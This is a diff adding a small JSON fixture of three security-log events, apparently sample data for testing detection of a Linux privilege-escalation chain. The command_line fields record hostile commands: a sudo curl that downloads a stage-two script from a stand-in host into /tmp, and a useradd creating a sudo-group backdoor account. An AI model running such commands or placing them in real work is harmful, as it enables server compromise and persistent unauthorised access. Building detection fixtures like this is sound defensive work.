@@ -1,0 +1,44 @@
+[
+  {
+    "event_id": "evt-pe-001",
+    "timestamp": "2026-11-01T01:20:10Z",
+    "hostname": "srv-prod-api",
+    "username": "www-data",
+    "source_ip": "10.0.0.84",
+    "destination_ip": "",
+    "event_type": "PROCESS_CREATE",
+    "event_id_native": "exec",
+    "process_name": "bash",
+    "command_line": "/bin/bash -c id",
+    "status": "SUCCESS",
+    "severity": "INFORMATIONAL"
+  },
+  {
+    "event_id": "evt-pe-002",
+    "timestamp": "2026-11-01T01:20:30Z",
+    "hostname": "srv-prod-api",
+    "username": "www-data",
+    "source_ip": "10.0.0.84",
+    "destination_ip": "",
+    "event_type": "PRIVILEGE_ESCALATION",
+    "event_id_native": "sudo",
+    "process_name": "sudo",
+    "command_line": "sudo -u root /usr/bin/curl -s http://198.51.100.45/stage2.sh -o /tmp/s.sh",
+    "status": "SUCCESS",
+    "severity": "HIGH"
+  },
+  {
+    "event_id": "evt-pe-003",
+    "timestamp": "2026-11-01T01:21:05Z",
+    "hostname": "srv-prod-api",
+    "username": "root",
+    "source_ip": "",
+    "destination_ip": "",
+    "event_type": "USER_CREATE",
+    "event_id_native": "useradd",
+    "process_name": "useradd",
+    "command_line": "useradd -m -s /bin/bash -G sudo secops-backdoor",
+    "status": "SUCCESS",
+    "severity": "HIGH"
+  }
+]
